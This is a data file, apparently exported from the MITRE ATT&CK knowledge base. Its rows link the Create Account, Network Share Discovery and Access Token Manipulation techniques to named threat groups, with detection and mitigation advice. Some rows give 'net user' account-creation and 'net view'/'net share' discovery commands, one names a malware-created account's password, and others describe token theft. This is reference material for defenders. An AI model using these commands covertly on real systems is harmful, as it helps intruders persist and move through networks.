649,['Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system and domain controller.[[CiteRef::Microsoft User Creation Event]] Perform regular audits of domain and local system accounts to detect suspicious accounts that may have been created by an adversary.'],[],[],[],"['Process Monitoring', 'Process command-line parameters', 'Authentication logs', 'Windows event logs']",['The <code>net user username \\password</code> and <code>net user username \\password \\domain</code> commands in [[Software/S0039|Net]] can be used to create a local or domain account respectively.[[CiteRef::Savill 1999]]'],['admin@338'],['admin@338'],['G0018'],['Use and enforce multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]] that may be used to create privileged accounts within an environment.\n\nAdversaries that create local accounts on systems may have limited access within a network if access levels are properly locked down. These accounts may only be needed for persistence on individual systems and their usefulness depends on the utility of the system they reside on.\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['Administrator'],[],"Software: Net, net.exe",['Credential Access'],['Technique/T1136'],['Create Account'],https://attack.mitre.org/wiki/Technique/T1136
650,['Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system and domain controller.[[CiteRef::Microsoft User Creation Event]] Perform regular audits of domain and local system accounts to detect suspicious accounts that may have been created by an adversary.'],[],[],[],"['Process Monitoring', 'Process command-line parameters', 'Authentication logs', 'Windows event logs']",[u'[[Software/S0084|Mis-Type]] may create a temporary user on the system named \u201cLost_{Unique Identifier}.\u201d[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],['Use and enforce multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]] that may be used to create privileged accounts within an environment.\n\nAdversaries that create local accounts on systems may have limited access within a network if access levels are properly locked down. These accounts may only be needed for persistence on individual systems and their usefulness depends on the utility of the system they reside on.\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['Administrator'],[],Software: Mis-Type,['Credential Access'],['Technique/T1136'],['Create Account'],https://attack.mitre.org/wiki/Technique/T1136
651,['Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system and domain controller.[[CiteRef::Microsoft User Creation Event]] Perform regular audits of domain and local system accounts to detect suspicious accounts that may have been created by an adversary.'],[],[],[],"['Process Monitoring', 'Process command-line parameters', 'Authentication logs', 'Windows event logs']",[u'[[Software/S0085|S-Type]] may create a temporary user on the system named \u201cLost_{Unique Identifier}\u201d with the password \u201cpond~!@6\u201d{Unique Identifier}.\u201d[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],['Use and enforce multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]] that may be used to create privileged accounts within an environment.\n\nAdversaries that create local accounts on systems may have limited access within a network if access levels are properly locked down. These accounts may only be needed for persistence on individual systems and their usefulness depends on the utility of the system they reside on.\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['Administrator'],[],Software: S-Type,['Credential Access'],['Technique/T1136'],['Create Account'],https://attack.mitre.org/wiki/Technique/T1136
652,['Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system and domain controller.[[CiteRef::Microsoft User Creation Event]] Perform regular audits of domain and local system accounts to detect suspicious accounts that may have been created by an adversary.'],[],[],[],"['Process Monitoring', 'Process command-line parameters', 'Authentication logs', 'Windows event logs']",['The <code>net user username \\password</code> and <code>net user username \\password \\domain</code> commands in [[Software/S0039|Net]] can be used to create a local or domain account respectively.[[CiteRef::Savill 1999]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],['Use and enforce multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]] that may be used to create privileged accounts within an environment.\n\nAdversaries that create local accounts on systems may have limited access within a network if access levels are properly locked down. These accounts may only be needed for persistence on individual systems and their usefulness depends on the utility of the system they reside on.\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['Administrator'],[],"Software: Net, net.exe",['Credential Access'],['Technique/T1136'],['Create Account'],https://attack.mitre.org/wiki/Technique/T1136
653,['Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system and domain controller.[[CiteRef::Microsoft User Creation Event]] Perform regular audits of domain and local system accounts to detect suspicious accounts that may have been created by an adversary.'],[],[],[],"['Process Monitoring', 'Process command-line parameters', 'Authentication logs', 'Windows event logs']",['The <code>net user username \\password</code> and <code>net user username \\password \\domain</code> commands in [[Software/S0039|Net]] can be used to create a local or domain account respectively.[[CiteRef::Savill 1999]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],['Use and enforce multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]] that may be used to create privileged accounts within an environment.\n\nAdversaries that create local accounts on systems may have limited access within a network if access levels are properly locked down. These accounts may only be needed for persistence on individual systems and their usefulness depends on the utility of the system they reside on.\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['Administrator'],[],"Software: Net, net.exe",['Credential Access'],['Technique/T1136'],['Create Account'],https://attack.mitre.org/wiki/Technique/T1136
654,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process Monitoring', 'Process command-line parameters', 'Network protocol analysis', 'Process use of network']",['The <code>net view \\\\remotesystem</code> and <code>net share</code> commands in [[Software/S0039|Net]] can be used to find shared drives and directories on remote and local systems respectively.[[CiteRef::Savill 1999]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire network share information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1135'],['Network Share Discovery'],https://attack.mitre.org/wiki/Technique/T1135
655,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process Monitoring', 'Process command-line parameters', 'Network protocol analysis', 'Process use of network']",['The <code>net view \\\\remotesystem</code> and <code>net share</code> commands in [[Software/S0039|Net]] can be used to find shared drives and directories on remote and local systems respectively.[[CiteRef::Savill 1999]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire network share information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1135'],['Network Share Discovery'],https://attack.mitre.org/wiki/Technique/T1135
656,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process Monitoring', 'Process command-line parameters', 'Network protocol analysis', 'Process use of network']",['The <code>net view \\\\remotesystem</code> and <code>net share</code> commands in [[Software/S0039|Net]] can be used to find shared drives and directories on remote and local systems respectively.[[CiteRef::Savill 1999]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire network share information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1135'],['Network Share Discovery'],https://attack.mitre.org/wiki/Technique/T1135
657,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process Monitoring', 'Process command-line parameters', 'Network protocol analysis', 'Process use of network']",['The <code>net view \\\\remotesystem</code> and <code>net share</code> commands in [[Software/S0039|Net]] can be used to find shared drives and directories on remote and local systems respectively.[[CiteRef::Savill 1999]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire network share information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1135'],['Network Share Discovery'],https://attack.mitre.org/wiki/Technique/T1135
658,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process Monitoring', 'Process command-line parameters', 'Network protocol analysis', 'Process use of network']",['The <code>net view \\\\remotesystem</code> and <code>net share</code> commands in [[Software/S0039|Net]] can be used to find shared drives and directories on remote and local systems respectively.[[CiteRef::Savill 1999]]'],['Threat Group-1314'],"['Threat Group-1314', 'TG-1314']",['G0028'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire network share information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1135'],['Network Share Discovery'],https://attack.mitre.org/wiki/Technique/T1135
659,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process Monitoring', 'Process command-line parameters', 'Network protocol analysis', 'Process use of network']",['The <code>net view \\\\remotesystem</code> and <code>net share</code> commands in [[Software/S0039|Net]] can be used to find shared drives and directories on remote and local systems respectively.[[CiteRef::Savill 1999]]'],['Naikon'],['Naikon'],['G0019'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire network share information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1135'],['Network Share Discovery'],https://attack.mitre.org/wiki/Technique/T1135
660,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process Monitoring', 'Process command-line parameters', 'Network protocol analysis', 'Process use of network']",['The <code>net view \\\\remotesystem</code> and <code>net share</code> commands in [[Software/S0039|Net]] can be used to find shared drives and directories on remote and local systems respectively.[[CiteRef::Savill 1999]]'],['admin@338'],['admin@338'],['G0018'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire network share information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1135'],['Network Share Discovery'],https://attack.mitre.org/wiki/Technique/T1135
661,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process Monitoring', 'Process command-line parameters', 'Network protocol analysis', 'Process use of network']",['The <code>net view \\\\remotesystem</code> and <code>net share</code> commands in [[Software/S0039|Net]] can be used to find shared drives and directories on remote and local systems respectively.[[CiteRef::Savill 1999]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire network share information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1135'],['Network Share Discovery'],https://attack.mitre.org/wiki/Technique/T1135
662,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process Monitoring', 'Process command-line parameters', 'Network protocol analysis', 'Process use of network']",['The <code>net view \\\\remotesystem</code> and <code>net share</code> commands in [[Software/S0039|Net]] can be used to find shared drives and directories on remote and local systems respectively.[[CiteRef::Savill 1999]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire network share information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1135'],['Network Share Discovery'],https://attack.mitre.org/wiki/Technique/T1135
663,"['If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity.  Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.[[CiteRef::Microsoft Command-line Logging]]\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.  \n\nThere are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g., <code>LogonUser</code>[[CiteRef::Microsoft LogonUser]], <code>DuplicateTokenEx</code>[[CiteRef::Microsoft DuplicateTokenEx]], and <code>ImpersonateLoggedOnUser</code>[[CiteRef::Microsoft ImpersonateLoggedOnUser]]).  Please see the referenced Windows API pages for more information.']",[],[],['Tom Ueltschi @c_APT_ure'],[],['[[Group/G0007|APT28]] has used CVE-2015-1701 to access the SYSTEM token and copy it into the current process as part of privilege escalation.[[CiteRef::FireEye Op RussianDoll]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Access tokens are an integral part of the security system within Windows and cannot be turned off.  However, an attacker must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require to do their job.\n\nAny user can also spoof access tokens if they have legitimate credentials.  Follow mitigation guidelines for preventing adversary use of [[Technique/T1078|Valid Accounts]].\n\nAlso limit opportunities for adversaries to increase privileges by limiting [[Privilege Escalation]] opportunities.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Privilege Escalation']",['Technique/T1134'],['Access Token Manipulation'],https://attack.mitre.org/wiki/Technique/T1134
664,"['If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity.  Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.[[CiteRef::Microsoft Command-line Logging]]\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.  \n\nThere are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g., <code>LogonUser</code>[[CiteRef::Microsoft LogonUser]], <code>DuplicateTokenEx</code>[[CiteRef::Microsoft DuplicateTokenEx]], and <code>ImpersonateLoggedOnUser</code>[[CiteRef::Microsoft ImpersonateLoggedOnUser]]).  Please see the referenced Windows API pages for more information.']",[],[],['Tom Ueltschi @c_APT_ure'],[],['[[Software/S0058|SslMM]] contains a feature to manipulate process privileges and tokens.[[CiteRef::Baumgartner Naikon 2015]]'],['Naikon'],['Naikon'],['G0019'],"['Access tokens are an integral part of the security system within Windows and cannot be turned off.  However, an attacker must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require to do their job.\n\nAny user can also spoof access tokens if they have legitimate credentials.  Follow mitigation guidelines for preventing adversary use of [[Technique/T1078|Valid Accounts]].\n\nAlso limit opportunities for adversaries to increase privileges by limiting [[Privilege Escalation]] opportunities.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: SslMM,"['Defense Evasion', 'Privilege Escalation']",['Technique/T1134'],['Access Token Manipulation'],https://attack.mitre.org/wiki/Technique/T1134
665,"['If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity.  Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.[[CiteRef::Microsoft Command-line Logging]]\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.  \n\nThere are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g., <code>LogonUser</code>[[CiteRef::Microsoft LogonUser]], <code>DuplicateTokenEx</code>[[CiteRef::Microsoft DuplicateTokenEx]], and <code>ImpersonateLoggedOnUser</code>[[CiteRef::Microsoft ImpersonateLoggedOnUser]]).  Please see the referenced Windows API pages for more information.']",[],[],['Tom Ueltschi @c_APT_ure'],[],['[[Software/S0154|Cobalt Strike]] can steal access tokens from exiting processes and make tokens from known credentials.[[CiteRef::cobaltstrike manual]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Access tokens are an integral part of the security system within Windows and cannot be turned off.  However, an attacker must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require to do their job.\n\nAny user can also spoof access tokens if they have legitimate credentials.  Follow mitigation guidelines for preventing adversary use of [[Technique/T1078|Valid Accounts]].\n\nAlso limit opportunities for adversaries to increase privileges by limiting [[Privilege Escalation]] opportunities.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: Cobalt Strike,"['Defense Evasion', 'Privilege Escalation']",['Technique/T1134'],['Access Token Manipulation'],https://attack.mitre.org/wiki/Technique/T1134
666,"['If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity.  Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.[[CiteRef::Microsoft Command-line Logging]]\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.  \n\nThere are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g., <code>LogonUser</code>[[CiteRef::Microsoft LogonUser]], <code>DuplicateTokenEx</code>[[CiteRef::Microsoft DuplicateTokenEx]], and <code>ImpersonateLoggedOnUser</code>[[CiteRef::Microsoft ImpersonateLoggedOnUser]]).  Please see the referenced Windows API pages for more information.']",[],[],['Tom Ueltschi @c_APT_ure'],[],"[""[[Group/G0032|Lazarus Group]] keylogger KiloAlfa obtains user tokens from interactive sessions to execute itself with API call <code>CreateProcessAsUserA</code> under that user's context.[[CiteRef::Novetta Blockbuster Tools]]""]",['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Access tokens are an integral part of the security system within Windows and cannot be turned off.  However, an attacker must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require to do their job.\n\nAny user can also spoof access tokens if they have legitimate credentials.  Follow mitigation guidelines for preventing adversary use of [[Technique/T1078|Valid Accounts]].\n\nAlso limit opportunities for adversaries to increase privileges by limiting [[Privilege Escalation]] opportunities.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Privilege Escalation']",['Technique/T1134'],['Access Token Manipulation'],https://attack.mitre.org/wiki/Technique/T1134
